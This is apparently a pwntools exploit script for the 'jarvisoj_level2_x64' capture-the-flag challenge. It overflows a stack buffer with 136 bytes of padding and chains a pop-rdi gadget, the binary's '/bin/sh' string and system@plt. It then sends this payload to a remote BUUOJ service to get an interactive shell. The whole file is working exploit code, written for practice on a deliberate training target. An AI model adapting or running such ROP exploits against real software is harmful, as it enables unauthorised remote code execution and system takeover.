from pwn import *


def jarvisoj_level2_x64(file_name='/mnt/hgfs/CyberSecurity/PWN/buuoj/jarvisoj_level2_x64'):
    context(log_level='debug', arch='amd64', os='linux')
    target = process([file_name])
    target = remote('node5.buuoj.cn', 28628)
    target_elf = ELF(file_name)

    system_plt = p64(target_elf.plt['system'])
    bin_sh_str = p64(next(target_elf.search(b'/bin/sh')))

    pop_ret_gadget = p64(0x4006b3)  # pop edi; ret

    payload = b'A' * 136
    # system(/bin/sh)
    payload += pop_ret_gadget + bin_sh_str + system_plt

    # gdb.attach(target)
    target.sendline(payload)

    target.interactive()


if __name__ == '__main__':
    jarvisoj_level2_x64()
